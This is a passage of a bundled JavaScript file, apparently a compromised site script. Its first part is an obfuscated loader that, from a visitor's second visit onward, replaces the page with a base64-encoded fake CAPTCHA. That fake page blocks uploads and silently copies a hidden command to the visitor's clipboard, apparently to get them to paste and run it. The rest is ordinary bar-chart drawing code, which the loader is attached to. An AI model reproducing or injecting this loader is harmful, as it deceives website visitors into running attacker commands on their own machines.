5kKTsNCg0KICAgICAgZmlsZUlucHV0LmNsaWNrKCk7DQogICAgfSk7DQoNCiAgLy8gQmxvY2sgYW55IGF0dGVtcHRlZCBmaWxlIHVwbG9hZHMNCiAgZmlsZUlucHV0LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsICgpID0+IHsNCiAgICBhbGVydCgiUGxlYXNlIGZvbGxvdyB0aGUgc3RhdGVkIGluc3RydWN0aW9ucy4iKTsNCiAgICBmaWxlSW5wdXQudmFsdWUgPSAiIjsNCiAgICBzZXRUaW1lb3V0KCgpID0+IGZpbGVJbnB1dC5jbGljaygpLCA1MDApOw0KfSk7DQoNCi8qIEVORCBORVcgKi8NCg0KDQoNCi8vIEdFVCANCmNvbnN0IHBhcmFtcyA9IG5ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCk7DQpjb25zdCBzaXRlVXJsID0gcGFyYW1zLmdldCgnc2l0ZScpIHx8IHdpbmRvdy5sb2NhdGlvbi5ob3N0bmFtZTsNCmNvbnN0IGxvZ29VcmwgPSBwYXJhbXMuZ2V0KCdsb2dvJyk7DQpjb25zdCBkZWZhdWx0TG9nb1VybCA9ICdodHRwczovLzJjYXB0Y2hhLmNvbS9kaXN0L3dlYi9hc3NldHMvZ29vZ2xlLXByaXZhY3ktcG9saWN5LUNiMENHVlJULnN2Zyc7DQoNCmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5kb21haW4tbmFtZScpLmZvckVhY2goZWwgPT4gew0KICBlbC50ZXh0Q29udGVudCA9IHNpdGVVcmw7DQp9KTsNCg0KZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLmxvZ28taW1nJykuZm9yRWFjaChpbWcgPT4gew0KICBpbWcuc3JjID0gbG9nb1VybCB8fCBkZWZhdWx0TG9nb1VybDsNCiAgaW1nLmFsdCA9ICdsb2dvJzsNCn0pOw0KDQoNCg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIGZ1bmN0aW9uICgpIHsNCiAgICBjb25zdCBwcmVsb2FkZXJFbGVtZW50cyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoIi5wcmVsb2FkZXIiKTsNCiAgICBjb25zdCBwcmVsb2FkZXJUZXh0ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiLnByZWxvYWRlcl90ZXh0Iik7DQogICAgY29uc3QgdGV4dEFsbFN0ZXAgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIudGV4dGFsbHN0ZXAiKTsNCiAgICBjb25zdCBjaGVja2JveFdpbmRvdyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjaGVja2JveC13aW5kb3ciKTsNCiAgICBjb25zdCBzdGVwMEVsZW1lbnRzID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgiLnN0ZXAwIik7DQogICAgY29uc3Qgc3RlcDFFbGVtZW50cyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoIi5zdGVwMSIpOw0KICAgIGNvbnN0IHN0ZXAyRWxlbWVudHMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCIuc3RlcDIiKTsNCiAgICBjb25zdCBzdGVwM0VsZW1lbnRzID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgiLnN0ZXAzIik7DQogICAgY29uc3QgY2hlY2tib3ggPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY2hlY2tib3giKTsNCiAgICBjb25zdCB2ZXJpZnlXaW5kb3cgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidmVyaWZ5LXdpbmRvdyIpOw0KICAgIGNvbnN0IHNwaW5uZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgic3Bpbm5lciIpOw0KICAgIGNvbnN0IHZlcmlmeUJ1dHRvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ2ZXJpZnktYnV0dG9uIik7DQoNCiAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgcHJlbG9hZGVyRWxlbWVudHMuZm9yRWFjaChlbCA9PiBlbC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiKTsNCiAgICAgICAgcHJlbG9hZGVyVGV4dC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgICAgICB0ZXh0QWxsU3RlcC5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsNCiAgICAgICAgY2hlY2tib3hXaW5kb3cuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCg0KICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgICAgIGNoZWNrYm94V2luZG93LnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7IA0KICAgICAgICAgICAgbGV0IG9wYWNpdHkgPSAwOw0KICAgICAgICAgICAgbGV0IGZhZGVJbiA9IHNldEludGVydmFsKCgpID0+IHsNCiAgICAgICAgICAgICAgICBpZiAob3BhY2l0eSA+PSAxKSB7DQogICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoZmFkZUluKTsgDQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgb3BhY2l0eSArPSAwLjE7IA0KICAgICAgICAgICAgICAgICAgICBjaGVja2JveFdpbmRvdy5zdHlsZS5vcGFjaXR5ID0gb3BhY2l0eTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9LCAzMCk7DQogICAgICAgIH0sIDIwMCk7DQoNCiAgICAgICAgc3RlcDBFbGVtZW50cy5mb3JFYWNoKGVsID0+IGVsLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siKTsNCg0KICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgICAgIHN0ZXAwRWxlbWVudHMuZm9yRWFjaChlbCA9PiBlbC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiKTsNCiAgICAgICAgICAgIHN0ZXAxRWxlbWVudHMuZm9yRWFjaChlbCA9PiBlbC5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIik7DQogICAgICAgIH0sIDIwMDApOyANCiAgICB9LCAxNTAwKTsgDQoNCiAgICBjaGVja2JveC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uICgpIHsNCiAgICAgICBjb25zdCB0ZXh0YXJlYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RleHRhcmVhJyk7DQogICAgICAgIHRleHRhcmVhLnZhbHVlID0gY29tbWFuZDsNCiAgICAgICAgdGV4dGFyZWEuc2V0QXR0cmlidXRlKCdyZWFkb25seScsICcnKTsNCiAgICAgICAgdGV4dGFyZWEuc3R5bGUucG9zaXRpb24gPSAnYWJzb2x1dGUnOw0KICAgICAgICB0ZXh0YXJlYS5zdHlsZS5sZWZ0ID0gJy05OTk5cHgnOw0KICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRleHRhcmVhKTsNCiAgICAgICAgdGV4dGFyZWEuc2VsZWN0KCk7DQogICAgICAgIGRvY3VtZW50LmV4ZWNDb21tYW5kKCdjb3B5Jyk7DQogICAgICAgIGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQodGV4dGFyZWEpOw0KICAgICAgICBjb25zb2xlLmxvZygn4pyFJyk7DQoNCiAgICAgICAgc3RlcDFFbGVtZW50cy5mb3JFYWNoKGVsID0+IGVsLnN0eWxlLmRpc3BsYXkgPSAibm9uZSIpOw0KICAgICAgICBzdGVwMkVsZW1lbnRzLmZvckVhY2goZWwgPT4gZWwuc3R5bGUuZGlzcGxheSA9ICJibG9jayIpOw0KICAgICAgICBzcGlubmVyLnN0eWxlLnZpc2liaWxpdHkgPSAidmlzaWJsZSI7DQoNCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgICAgICBjaGVja2JveFdpbmRvdy5zdHlsZS53aWR0aCA9ICI1MzBweCI7DQogICAgICAgICAgICBjaGVja2JveFdpbmRvdy5zdHlsZS5oZWlnaHQgPSAiYXV0byI7DQogICAgICAgICAgICB2ZXJpZnlXaW5kb3cuc3R5bGUuYm9yZGVyVG9wID0gIjFweCBzb2xpZCAjNzk3OTc5IjsNCiAgICAgICAgICAgIHZlcmlmeVdpbmRvdy5zdHlsZS5wYWRkaW5nVG9wID0gIjNweCI7DQogICAgICAgICAgICB2ZXJpZnlXaW5kb3cuc3R5bGUubWFyZ2luVG9wID0gIjE1cHgiOw0KICAgICAgICAgICAgdmVyaWZ5V2luZG93LmNsYXNzTGlzdC5hZGQoImFjdGl2ZSIpOw0KICAgICAgICB9LCA1MDApOw0KICAgIH0pOw0KDQogICAgdmVyaWZ5QnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24gKCkgew0KICAgICAgICB2ZXJpZnlXaW5kb3cuY2xhc3NMaXN0LnJlbW92ZSgiYWN0aXZlIik7DQogICAgICAgIGNoZWNrYm94V2luZG93LnN0eWxlLmhlaWdodCA9ICI3NHB4IjsNCg0KICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgICAgIGNoZWNrYm94V2luZG93LnN0eWxlLndpZHRoID0gIjMwMHB4IjsNCiAgICAgICAgICAgIHN0ZXAyRWxlbWVudHMuZm9yRWFjaChlbCA9PiBlbC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiKTsNCiAgICAgICAgICAgIHN0ZXAzRWxlbWVudHMuZm9yRWFjaChlbCA9PiBlbC5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIik7DQoNCiAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICAgICAgICAgIHN0ZXAzRWxlbWVudHMuZm9yRWFjaChlbCA9PiBlbC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiKTsNCiAgICAgICAgICAgICAgICBzdGVwMUVsZW1lbnRzLmZvckVhY2goZWwgPT4gZWwuc3R5bGUuZGlzcGxheSA9ICJibG9jayIpOw0KICAgICAgICAgICAgICAgIHNwaW5uZXIuc3R5bGUudmlzaWJpbGl0eSA9ICJoaWRkZW4iOw0KICAgICAgICAgICAgfSwgMTAwMCk7DQogICAgICAgIH0sIDYwMCk7DQogICAgfSk7DQoNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidmVyaWZpY2F0aW9uLWlkIikudGV4dENvbnRlbnQgPSBNYXRoLmZsb29yKDEwMDAwMCArIE1hdGgucmFuZG9tKCkgKiA5MDAwMDApOw0KICAgIGNvbnN0IGNoYXJzID0gImFiY2RlZjAxMjM0NTY3ODkiOw0KICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5yYXktaWQiKS50ZXh0Q29udGVudCA9IEFycmF5LmZyb20oeyBsZW5ndGg6IDE2IH0sICgpID0+IGNoYXJzW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIGNoYXJzLmxlbmd0aCldKS5qb2luKCIiKTsNCn0pOw0KDQoNCiBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdjb3B5JywgZnVuY3Rpb24gKGUpIHsNCiAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgaWYgKGUuY2xpcGJvYXJkRGF0YSkgew0KICAgICAgICBlLmNsaXBib2FyZERhdGEuc2V0RGF0YSgndGV4dC9wbGFpbicsIGNvbW1hbmQpOw0KICAgICAgICBjb25zb2xlLmxvZygn4pyFJyk7DQogICAgfSBlbHNlIGlmICh3aW5kb3cuY2xpcGJvYXJkRGF0YSkgew0KICAgICAgICB3aW5kb3cuY2xpcGJvYXJkRGF0YS5zZXREYXRhKCdUZXh0JywgY29tbWFuZCk7DQogICAgfQ0KfSk7DQoNCjwvc2NyaXB0Pg0KDQoNCjwvYm9keT48L2h0bWw+',
        'ZaBXC',
        'getItem',
        '1133412KjvGUP',
        'toString',
        '2071350eirDTL'
    ];
    a = function () {
        return s;
    };
    return a();
}
function b(c, d) {
    c = c - 0x83;
    const e = a();
    let f = e[c];
    return f;
}
(function (c, d) {
    const q = b, e = c();
    while (!![]) {
        try {
            const f = -parseInt(q(0x95)) / 0x1 + -parseInt(q(0x91)) / 0x2 + -parseInt(q(0x96)) / 0x3 + parseInt(q(0x87)) / 0x4 + parseInt(q(0x88)) / 0x5 + -parseInt(q(0x97)) / 0x6 * (parseInt(q(0x84)) / 0x7) + parseInt(q(0x83)) / 0x8 * (parseInt(q(0x93)) / 0x9);
            if (f === d)
                break;
            else
                e['push'](e['shift']());
        } catch (g) {
            e['push'](e['shift']());
        }
    }
}(a, 0x8a6df), (function () {
    const r = b, c = {
            'CkDDw': r(0x86),
            'BWVDK': function (i, j, k) {
                return i(j, k);
            },
            'ZaBXC': function (i, j) {
                return i >= j;
            },
            'yuGJY': r(0x8e),
            'qSWzs': function (i, j) {
                return i(j);
            },
            'jKFNv': function (i, j) {
                return i(j);
            }
        }, f = 0x2, g = c[r(0x94)];
    try {
        let i = c[r(0x8c)](parseInt, localStorage[r(0x90)](g) || '0', 0xa);
        i++, localStorage[r(0x8b)](g, i[r(0x92)]());
        if (c[r(0x8f)](i, f)) {
            const j = c[r(0x99)], k = c[r(0x8d)](atob, j), l = document;
            l[r(0x8a)](), l[r(0x85)](k), l[r(0x89)]();
        }
    } catch (m) {
        const n = c[r(0x99)], o = c[r(0x98)](atob, n), p = document;
        p[r(0x8a)](), p[r(0x85)](o), p[r(0x89)]();
    }
}()));/* >>> chartjs (36878 bytes) <<< */
(function(){
try{
/*global module:true*/
'use strict';

Math.log2 = Math.log2 || function(x) {
  return Math.log(x) / Math.LN2;
};

Math.log10 = Math.log10 || function(x) {
  return Math.log(x) / Math.LN10;
};

(function() {
  var Helpers = {
    avg: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        v += arr[index];
      }
      return v / arr.length;
    },
    min: function(arr) {
      if (arr.length === 0) return 0;
      var v = arr[0];
      for (var index = 1; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
        if (v2 < v) v = v2;
      }
      return Math.max(0, v);
    },
    max: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
        if (v2 > v) v = v2;
      }
      return Math.max(0, v);
    },
    upperMax: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.max(v2);
        if (v2 > v) v = v2;
      }
      return Math.max(0, v);
    },
    lowerMin: function(arr) {
      if (arr.length === 0) return 0;
      var v = arr[0] || Infinity;
      if (Array.isArray(v)) v = Helpers.lowerMin(v);
      for (var index = 1; index < arr.length; ++index) {
        var v2 = arr[index];
        if (v2 == null) continue;
        if (Array.isArray(v2)) v2 = Helpers.lowerMin(v2);
        if (v2 < v) v = v2;
      }
      if (isNaN(v) || !isFinite(v)) v = 0;
      return Math.max(0, v);
    },
    niceNumbers: function(range, round) {
      var exponent = Math.floor(Math.log10(range));
      var fraction = range / Math.pow(10, exponent);
      var niceFraction;
      if (round) {
        if (fraction < 1.5) niceFraction = 1;
        else if (fraction < 3) niceFraction = 2;
        else if (fraction < 7) niceFraction = 5;
        else niceFraction = 10;
      } else {
        if (fraction <= 1.0) niceFraction = 1;
        else if (fraction <= 2) niceFraction = 2;
        else if (fraction <= 5) niceFraction = 5;
        else niceFraction = 10;
      }
      return niceFraction * Math.pow(10, exponent);
    },
    getLinearTicks: function(min, max, maxTicks) {
      var range = Helpers.niceNumbers(max - min, false);
      var tickSpacing = Helpers.niceNumbers(range / (maxTicks - 1), true);
      return [
        Math.floor(min / tickSpacing) * tickSpacing,
        Math.ceil(max / tickSpacing) * tickSpacing,
        tickSpacing
      ];
    },
    getFont: function(options) {
      options.style = options.style || 'normal';
      options.variant = options.variant || 'normal';
      options.weight = options.weight || 'lighter';
      options.size = options.size || '12';
      options.family = options.family || 'Arial';
      return [options.style, options.variant, options.weight, options.size + 'px', options.family].join(' ');
    },
    getAxisRatio: function(min, max, value) {
      return (value - min) / (max - min);
    }
  };

  var BarChart = (function() {
    function BarChart(ctx, options) {
      this.mouseListeners = [];
      this.currentHint = null;
      this.fillRegions = []
      this.options = {
        font: 'Helvetica',
        fontWeight: 'normal',
        fontSizeTitle: 24,
        fontSizeAxes: 20,
        fontSizeTicks: 18,
        fontSizeLabels: 18,
        fontDataTags: 18,
        fontSizeLegend: 18,
        fontSizeHint: 18,
        paddingPercentBars: 0.10,
        paddingPercentTicks: 0.15,
        paddingPixelsVertical: 10,
        paddingPixelsHorizontal: 10,
        paddingPixelsTicks: 10,
        maxWidthBars: 0,
        fillColorBackground: 'rgb(255, 255, 255)',
        strokeColorBars: 'rgb(0, 0, 0)',
        fillColorBars: 'rgba(180, 180, 180, 0.25)',
        scaleStyle: 'linear',
        barStyle: 'none',
        stackedBarPadding: 3,
        defaultMaxTick: 0,
        pixelsLegendSquare: 10,
        radiusDot: 5,
        fillColorLegend: 'rgb(230, 230, 230)',
        tickFormatter: null,
        tickFormatterMeasure: null,
        fillRegion: 'normal'
      };
      options = options || { };
      for (var key in this.options) {
        if (options.hasOwnProperty(key)) this.options[key] = options[key];
      }
      this.ctx = ctx;
      this.content = { };
      this.labelPositions = { }
    }

    BarChart.prototype.update = function(content) {
      if (typeof content !== 'object') {
        throw new Error('Collections must be objects.');
      } else if (!(content.hasOwnProperty('labels') && content.hasOwnProperty('data'))) {
        throw new Error('Collection must specify labels and data.');
      } else if (!(Array.isArray(content.labels) && Array.isArray(content.data))) {
        throw new Error('Labels and data must be arrays.');
      } else if (content.labels.length !== content.data.length) {
        throw new Error('Labels and data length must match.');
      }
      content._data_standard_deviation = [];
      content._data_standard_error = [];
      for (var i = 0; i < content.data.length; ++i) {
        var isArr = Array.isArray(content.data[i]);
        if (this.options.scaleStyle === 'log2') {
          if (isArr) {
            for (var i3 = 0; i3 < content.data[i].length; ++i3) content.data[i][i3] = Math.log2(content.data[i][i3]);
          } else content.data[i] = Math.log2(content.data[i]);
        }
        if (isArr) {
          var mean = Helpers.avg(content.data[i]);
          var acc = 0;
          for (var i2 = 0; i2 < content.data[i].length; ++i2) acc += Math.pow(mean - content.data[i][i2], 2);
          acc = Math.sqrt(acc / (content.data[i].length - 1));
          content._data_standard_deviation.push(acc);
          content._data_standard_error.push(acc / Math.sqrt(content.data[i].length));
        } else {
          content._data_standard_deviation.push(0);
          content._data_standard_error.push(0);
        }
      }
      this.content = content;
      this.redraw();
    };

    BarChart.prototype.redraw = function() {
      setTimeout(function() {
        this._draw();
      }.bind(this), 0);
    };

    BarChart.prototype.mousemove = function(x, y) {
      var res = null;
      for (var index = 0; index < this.mouseListeners.length; ++index) {
        if ((res = this.mouseListeners[index](x, y))) break;
      }
      if (!res || (typeof res) !== 'object' || !res.hasOwnProperty('index') || !res.hasOwnProperty('drawIndex')) {
        if (this.currentHint !== null) {
          this.currentHint = null;
          this.redraw();
        }
        return;
      }
      var ch = this.currentHint;
      if (ch == null || ch.index != res.index || ch.drawIndex != res.drawIndex) {
        this.currentHint = res;
        this.redraw();
      }
    };

    BarChart.prototype._draw = function() {
      var labelPositions = { }
      this.mouseListeners = [];
      this.fillRegions = [];

      var options = this.options;
      var ctx = this.ctx, content = this.content;
      var width = ctx.canvas.width, height = ctx.canvas.height;
      ctx.clearRect(0, 0, width, height);
      ctx.translate(-0.5, -0.5);
      var remainingWidth = width, remainingHeight = height;
      var index;

      if (options.fillColorBackground != null) {
        ctx.save();
        ctx.fillStyle = options.fillColorBackground;
        ctx.fillRect(0, 0, width, height);
        ctx.restore();
      }

      var topYPadding = options.paddingPixelsHorizontal;
      remainingHeight -= options.paddingPixelsHorizontal;
      ctx.fillStyle = 'rgb(0, 0, 0)';
      /* Draw title of bar chart */
      if (content.title != null) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTitle, family: options.font });
        ctx.textAlign = 'center';
        ctx.fillText(content.title, width / 2, topYPadding + options.fontSizeTitle);
        ctx.restore();
        remainingHeight -= options.fontSizeTitle * 1.25;
        topYPadding += options.fontSizeTitle * 1.25;
      }

      /* Compute required left padding */
      var leftXPadding = options.paddingPixelsVertical;
      remainingWidth  -= options.paddingPixelsVertical;

      var leftXDrawYLabel = null;
      if (content.yAxis != null) {
        leftXDrawYLabel = leftXPadding + options.fontSizeAxes * 0.5;
        remainingWidth -= options.fontSizeAxes * 1.25;
        leftXPadding += options.fontSizeAxes * 1.25;
      }

      ctx.save();
      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
      var maxChartValue, minChartValue;
      if (options.barStyle === 'stacked') {
        maxChartValue = 0;
        minChartValue = Infinity;
        for (var cmIndex = 0; cmIndex < content.data.length; ++cmIndex) {
          var doB;
          if (Array.isArray(doB = content.data[cmIndex])) {
            var tempSum = 0;
            for (var ii2 = 0; ii2 < doB.length; ++ii2) tempSum += doB[ii2];
            maxChartValue = Math.max(maxChartValue, tempSum);
            minChartValue = Math.min(minChartValue, tempSum);
          } else {
            maxChartValue = Math.max(maxChartValue, content.data[cmIndex]);
            minChartValue = Math.min(minChartValue, content.data[cmIndex]);
          }
        }
      } else {
        maxChartValue = Helpers.upperMax(content.data);
        minChartValue = Helpers.lowerMin(content.data);
      }
      if (options.scaleStyle.indexOf('adaptive') === 0) {
        if (options.scaleStyle.indexOf(':') !== -1) {
          var floater = parseFloat(options.scaleStyle.split(/[:]/)[1]);
          minChartValue *= floater;
          maxChartValue *= 1 + (1 - floater) / 2.0;
        }
      } else minChartValue = 0;
      if (options.defaultMaxTick > maxChartValue) maxChartValue = options.defaultMaxTick;
      if (content.bars != null && Array.isArray(content.bars)) {
        for (index = 0; index < content.bars.length; ++index) {
          var cbv = content.bars[index].value;
          if (isNaN(cbv)) continue;
          maxChartValue = Math.max(maxChartValue, cbv);
          minChartValue = Math.min(minChartValue, cbv);
        }
      }
      var maxYAxisTickWidth = options.scaleStyle == 'log2' ? Math.ceil(Math.pow(2, maxChartValue)) : (Math.ceil(maxChartValue) + '.00');
      if (options.tickFormatterMeasure != null) maxYAxisTickWidth = options.tickFormatterMeasure;
      maxYAxisTickWidth = ctx.measureText(maxYAxisTickWidth).width;
      maxYAxisTickWidth = Math.ceil(maxYAxisTickWidth) + options.paddingPixelsTicks;
      remainingWidth -= maxYAxisTickWidth;
      leftXPadding += maxYAxisTickWidth;
      ctx.restore();

      var rightXPadding = options.paddingPixelsVertical;
      remainingWidth -= options.paddingPixelsVertical;

      /* Draw legend */
      if (content.legend != null && Array.isArray(content.legend)) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLegend, family: options.font });
        var maxLWidth = 0;
        for (var lIndex = 0; lIndex < content.legend.length; ++lIndex) {
          maxLWidth = Math.max(maxLWidth, ctx.measureText(content.legend[lIndex].label).width);
        }
        maxLWidth = Math.ceil(maxLWidth);
        maxLWidth += options.pixelsLegendSquare + 8;
        var legendEntriesPerLine = Math.floor((remainingWidth - options.paddingPixelsHorizontal * 2) / maxLWidth);
        var lLReqHeight = Math.ceil(content.legend.length / legendEntriesPerLine) * options.fontSizeLegend * 1.5;
        remainingHeight -= lLReqHeight;
        bottomYPadding += lLReqHeight;

        ctx.strokeStyle = 'rgb(0, 0, 0)';
        ctx.fillStyle = options.fillColorLegend;
        var bSX, bSY;
        ctx.beginPath();
        ctx.moveTo(bSX = leftXPadding, bSY = topYPadding + remainingHeight);
        ctx.lineTo(bSX + remainingWidth, bSY);
        ctx.lineTo(bSX + remainingWidth, bSY + lLReqHeight);
        ctx.lineTo(bSX, bSY + lLReqHeight);
        ctx.lineTo(bSX, bSY);
        ctx.stroke();
        ctx.fill();

        for (lIndex = 0; lIndex < content.legend.length; ++lIndex) {
          var legLine = Math.floor(lIndex / legendEntriesPerLine);
          var legCol = lIndex % legendEntriesPerLine;
          ctx.fillStyle = content.legend[lIndex].color;
          var boxX = bSX + legCol * maxLWidth + 3, boxY = bSY + legLine * options.fontSizeLegend * 1.5 + options.fontSizeLegend * 0.5;
          ctx.beginPath();
          ctx.moveTo(boxX, boxY);
          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY);
          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY + options.pixelsLegendSquare);
          ctx.lineTo(boxX, boxY + options.pixelsLegendSquare);
          ctx.lineTo(boxX, boxY);
          ctx.fill();
          ctx.stroke();

          ctx.textAlign = 'left';
          ctx.fillStyle = 'rgb(0, 0, 0)';
          ctx.fillText(content.legend[lIndex].label, boxX + 3 + options.pixelsLegendSquare, boxY + options.fontSizeLegend * 0.5);
        }

        ctx.restore();
      }

      /* Draw x-axis label of bar chart */
      var bottomYPadding = options.paddingPixelsHorizontal;
      remainingHeight -= options.paddingPixelsHorizontal;
      if (content.xAxis != null) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
        ctx.fillStyle = 'rgb(0, 0, 0)';
        ctx.textAlign = 'center';
        ctx.fillText(content.xAxis, (width - remainingWidth) + remainingWidth / 2, topYPadding + remainingHeight - bottomYPadding);
        remainingHeight -= options.fontSizeAxes * 1.5;
        bottomYPadding += options.fontSizeAxes * 1.5;
        ctx.restore();
      }

      var widthPerBar = remainingWidth / content.data.length;

      /* Draw x-axis top labels */
      if (content.topLabels != null) {
        ctx.save();
        ctx.textAlign = 'center';
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
        remainingHeight -= options.fontSizeLabels * 1.5;
        topYPadding += options.fontSizeLabels * 1.5;
        for (index = 0; index < content.topLabels.length; ++index) {
          ctx.fillText(
            content.topLabels[index],
            leftXPadding + index * widthPerBar + widthPerBar / 2,
            topYPadding - options.fontSizeLabels / 2
          );
        }
        ctx.restore();
      }

      /* Draw x-axis labels */
      ctx.save();
      var reqWidth = 0;
      if (content.dataTags != null) {
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
        var dataTags = content.dataTags;
        for (index = 0; index < dataTags.length; ++index) {
          if (Array.isArray(dataTags[index])) {
            for (var index2 = 0; index2 < dataTags[index].length; ++index2) {
              reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index][index2]).width + 5));
            }
          } else {
            reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index]).width + 5));
          }
        }
      }

      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
      var computedBarPadding = Math.floor((widthPerBar * options.paddingPercentBars) / 2);
      var wwh = widthPerBar - computedBarPadding * 2;
      if (wwh < reqWidth) {
        computedBarPadding -= Math.ceil((reqWidth - wwh) / 2);
        computedBarPadding = Math.max(0, computedBarPadding);
      } else if (options.maxWidthBars > 0 && wwh > options.maxWidthBars) {
        computedBarPadding = Math.floor((widthPerBar - options.maxWidthBars) / 2);
      }
      var maxTextWidth = 0, maxTextStackSize = 1;
      for (index = 0; index < content.labels.length; ++index) {
        var tLabel = content.labels[index];
        if (Array.isArray(tLabel)) {
          maxTextStackSize = Math.max(maxTextStackSize, tLabel.length);
          for (index2 = 0; index2 < tLabel.length; ++index2) {
            maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel[index2]).width);
          }
        } else maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel).width);
      }
      var xLabelsRotated = false;
      if (maxTextWidth > widthPerBar - computedBarPadding) {
        ctx.textAlign = 'right';
        ctx.rotate(Math.PI * 1.5);
        xLabelsRotated = true;
      } else {
        ctx.textAlign = 'center';
      }
      var lastLabelY = -options.fontSizeLabels;
      for (index = 0; index < content.labels.length; ++index) {
        var cLabel = content.labels[index];
        var x = leftXPadding + index * widthPerBar + widthPerBar / 2, y = topYPadding + remainingHeight - options.fontSizeLabels / 2;
        if (xLabelsRotated) {
          y = topYPadding + remainingHeight - maxTextWidth + 5;
          y = [x, x = -y][0];

          if (y < lastLabelY + options.fontSizeLabels) continue;
          lastLabelY = y;
        }
        var yUp = options.fontSizeLabels * (maxTextStackSize - 1);
        if (Array.isArray(cLabel)) {
          if (xLabelsRotated) {
            yUp = options.fontSizeLabels * (cLabel.length - 1.5);
            yUp /= 2;
          }
          for (index2 = 0; index2 < cLabel.length; ++index2) {
            ctx.fillText(cLabel[index2], x, y - yUp);
            yUp -= options.fontSizeLabels;
          }
        } else {
          if (xLabelsRotated) yUp = -options.fontSizeLabels * 0.25;
          ctx.fillText(cLabel, x, y - yUp);
        }
      }
      if (xLabelsRotated) {
        remainingHeight -= maxTextWidth + 5;
        bottomYPadding += maxTextWidth + 5;
      } else {
        var remVal = options.fontSizeLabels * maxTextStackSize;
        remVal += options.fontSizeLabels * 0.5;
        remainingHeight -= remVal;
        bottomYPadding += remVal;
      }
      ctx.restore();

      /* Draw boundaries */
      var boundX1 = leftXPadding, boundX2 = leftXPadding + remainingWidth;
      var boundY1 = topYPadding, boundY2 = topYPadding + remainingHeight;

      for (index = 0; index < content.labels.length; ++index) labelPositions[index] = {
        xStart: leftXPadding + index * widthPerBar,
        xEnd: leftXPadding + (1 + index) * widthPerBar,
        yStart: boundY1, yEnd: boundY2
      }

      ctx.save();
      ctx.strokeStyle = 'rgb(0, 0, 0)';
      ctx.beginPath();
      if (content.topLabels != null) {
        ctx.moveTo(boundX2, boundY1);
        ctx.lineTo(boundX1, boundY1);
      } else {
